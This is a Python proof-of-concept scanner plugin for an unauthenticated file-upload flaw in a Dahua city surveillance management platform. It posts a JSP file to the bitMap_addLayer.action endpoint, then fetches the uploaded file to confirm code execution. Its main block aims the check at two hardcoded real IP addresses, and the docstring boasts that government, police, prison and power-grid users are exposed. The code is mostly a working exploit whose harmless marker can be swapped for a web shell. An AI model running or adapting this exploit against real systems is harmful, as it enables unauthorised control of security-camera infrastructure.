#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  大华城市安防监控系统平台管理未授权访问getshell(可漫游)
Author    :  a
mail      :  a@lcx.cc
refer     ：WooYun-2015-151421
浙江大华作为全国第二大的监控产品供应商和解决方案服务商，
其产品在党政、公安、监狱、学校等占有很大的市场份额，
top2的监控产品供应商的用户量可想而知
国家电网某站也中枪
"""
import urlparse
import re

def assign(service, arg):
    if service == 'dahua_dss':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    raw="""POST /emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null} HTTP/1.1
Host: 4g.139hz.com
Content-Length: 425
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGcEYB5EKXKmZXB0R
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: JSESSIONID=93D9D8770B4851FA772424EC133877EC

------WebKitFormBoundaryGcEYB5EKXKmZXB0R
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: application/octet-stream

<%
out.println(12345+54321+10000);
%>
------WebKitFormBoundaryGcEYB5EKXKmZXB0R
Content-Disposition: form-data; name="desc"

 
------WebKitFormBoundaryGcEYB5EKXKmZXB0R
Content-Disposition: form-data; name="layerName"

test
------WebKitFormBoundaryGcEYB5EKXKmZXB0R--
"""
    url = arg + "emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}"
    code2, head, res, errcode, _ = curl.curl2(url ,raw=raw)
     
    if (code2 == 200):
        m =  re.search('"path":"(.*?)",',res,re.S)
        if m:
            jsp = m.group(1)
            u = arg + 'upload/emap/' +jsp
            code2, head, res, errcode, _ = curl.curl2(u )
            if (code2==200) and '76666' in res:
                security_hole(u)

if __name__ == '__main__':
    from dummy import *
    audit(assign('dahua_dss', 'http://61.185.80.228/')[1])
    audit(assign('dahua_dss', 'http://113.106.236.12:8000/')[1])